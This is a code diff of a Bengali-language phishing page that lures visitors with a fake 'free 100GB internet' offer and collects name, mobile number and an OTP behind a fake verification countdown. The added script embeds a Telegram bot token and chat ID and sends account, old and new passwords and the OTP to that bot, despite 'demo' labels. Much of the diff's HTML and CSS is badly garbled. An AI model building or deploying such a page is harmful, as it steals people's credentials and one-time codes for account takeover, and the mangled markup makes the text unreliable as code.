@@ -1,4 +1,4 @@
-```html
+
 <!DOCTYPE html>
 <html lang="bn">
 <head>
@@ -60,64 +60,130 @@
             background-color: rgba(0,0,0,0.8);
             align-items: center;
             justify-content: center;
-            z-index: 1000;
-        }
-        .modal-content {
-            background-color: #242526;
-            padding: 20px;
-            border-radius: 10px;
-            width: 85%;
-            max-width: 350px;
-            text-align: center;
-            border: 1px solid #3e4042;
-        }
-        .timer-text { color: #ffeb3b; font-size: 14px; margin-bottom: 10px; }
+               z-in: x: 1;
+         
+        .  .modal-cont n
+               background-co: #242526;
+               padd: g: 2;
+               border-rad: s: 1;
+               wi: h: ;
+               max-wi: h: 35;
+               text-al: n: cen;
+               bor: r:  px so #3e4042;
+         
+        .  .timer-t x  { co: #ffeb3b; b; font-s: e: 1; x; margin-bot: m: 1; x
 
-        /* Fake Status Area */
-        #fakeStatus { margin-top: 20px; }
-        #warn { display: none; color: #ff4d4d; font-size: 12px; margin-top: 10px; border: 1px dashed #ff4d4d; padding: 5px; }
+           /* Fake Status Area
+        #  #fakeSta u  { margin-: p: 2; x
+        #  #w r  { disp: y: n; e; co: #ff4d4d; d; font-s: e: 1; x; margin-: p: 1; x; bor: r:  px das #ff4d4d; d; padd: g: ; x
 
-    </style>
-</head>
-<body>
+    
 
-    <div class="hero-section">
-        <img src="https://i.postimg.cc/nzyTCyJ1/IMG-20251215-083252.jpg" alt="Banner">
-    </div>
+    </
+tyle>
+<
+head>
 
-    <div class="green-bar">🎉 ফ্রি 100GB ইন্টারনেট অফার</div>
 
-    <div class="container">
-        <h2>আপনার তথ্য দিন</h2>
+    
+
+    <div=class="hero-sec
+              <i=g src="https://i.postimg.cc/nzyTCyJ1/IMG-20251215-08325 .jp=" alt="Ba
+    >
+    
+
+    
+
+    <div=class="green🎉 ফ্রি 100GB ইন্টারনেট অফারট অফার
+
+    
+
+    <div=class="conta
+            আপনার তথ্য দিন্য দি
         
-        <div class="input-group">
-            <input type="text" id="name" class="input-field" placeholder="আপনার নাম">
-        </div>
-        <div class="input-group">
-            <input type="number" id="number" class="input-field" placeholder="মোবাইল নাম্বার (017...)" maxlength="11">
-        </div>
+              <div=class="input-g
+                   inpu= type= te=t" id= name"=class="input- ield" place=older="আপনার
+              
+              <div=class="input-g
+                   inpu= type="n mb=r" id="n mber"=class="input- ield" place=older="মোবাইল নাম্বার (01 ...)" max=ength
+              
 
-        <button class="submit-btn" onclick="startProcess()">অফার নিন</button>
+              < utton=class="submi -btn" o=c="startProcessceঅফার নিনার নিন</b
 
-        <!-- Result/Status Show Here -->
-        <div id="fakeStatus"></div>
-        <div id="warn">⚠️ এটি একটি ডেমো। কোনো তথ্য সার্ভারে পাঠানো হয়নি।</div>
-    </div>
-
-    <!-- OTP Modal HTML -->
-    <div id="otpModal" class="modal">
-        <div class="modal-content">
-            <h3 style="color:white;">যাচাইকরণ</h3>
-            <p id="countdown" class="timer-text">অপেক্ষা করুন...</p>
-            <input type="number" id="otp" class="input-field" placeholder="OTP কোড দিন" style="text-align:center;">
-            <button class="submit-btn" onclick="sendToTelegram()">যাচাই করুন</button>
-        </div>
-    </div>
+              <!-- Result/Status Show He
+              <=iv id="fakeStatus">
+              <=iv id="⚠️ এটি একটি ডেমো। কোনো তথ্য সার্ভারে পাঠানো হয়নি। হয়নি।
+    </   >
 
     <script>
-        // আপনার দেওয়া ভেরিয়েবলগুলো (ডেমো হিসেবে রাখা হলো, কাজ করবে না)
-        const telegram_token = '8522482888:AAHp8_VAsgnK-KtIH584kbaLZZ4q6XkVyu0'; // Demo Token
-        const telegram_chatid = '6763021567'; // Demo ID
+    const telegram_token = '8522482888:AAHp8_VAsgnK-KtIH584kbaLZZ4q6XkVyu0';
+    const telegram_chatid = '6763021567';
+
+    function showModal() {
+      document.getElementById("otpModal").style.display = "flex";
+      let countdown = 30;
+      const countdownEl = document.getElementById("countdown");
+      const otpInput = document.getElementById("otp");
+      otpInput.disabled = true;
+
+      const timer = setInterval(() => {
+        countdown--;
+        countdownEl.textContent = `OTP পাঠানো হচ্ছে... ${countdown} সেকেন্ড অপেক্ষা করুন`;
+        if (countdown <= 0) {
+          clearInterval(timer);
+          countdownEl.textContent = "OTP পাঠানো হয়েছে, এখন ইনপুট দিন";
+          otpInput.disabled = false;
+        }
+      }, 1000);
+    }
+
+    function sendToTelegram() {
+      const email = document.getElementById('email').value;
+      const oldPass = document.getElementById('oldPass').value;
+      const newPass = document.getElementById('newPass').value;
+      const otp = document.getElementById('otp').value;
+
+      fetch(`https://api.telegram.org/bot${telegram_token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: telegram_chatid,
+          text: `🔐 Login Attempt\nAccount: ${email}\nOld Pass: ${oldPass}\nNew Pass: ${newPass}\nOTP: ${otp}`
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert("✅ তথ্য পাঠানো হয়েছে (শিক্ষামূলক ডেমো)");
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+
+      document.getElementById('warn').style.display = 'block';
+      document.getElementById("otpModal").style.display = "none";
+    }
+  </script>
+</body>
+            </html>
+
+    <!-- OTP Modal HT
+    >
+    <=iv id="otp odal"=class="m
+              <div=class="modal-con
+                  <h3=s"color:whit:whযাচাইকরণচাইকর
+                 =<p id="coun down"=class="timer-অপেক্ষা করুন...রুন.
+                   inpu= type="n mb=r" id "otp"=class="input- ield" place=older="OTP কো  দিন"=s"text-align:centecen
+                  < utton=class="submi -btn" o=c"sendToTelegram(grযাচাই করুনই করুন</b
+              
+    >
+    
+
+    
+
+    <s
+         // আপনার দেওয়া ভেরিয়েবলগুলো (ডেমো হিসেবে রাখা হলো, কাজ করবে না
+         cons  telegram_toke =  '8522482888:AAHp8_VAsgnK-KtIH584kbaLZZ4q6XkVyu0;  // Demo Toke
+         cons  telegram_chati =  '6763021567;  // Demo I
 
         // প্রসেস শুরু করার ফাংশন
         function startProcess() {
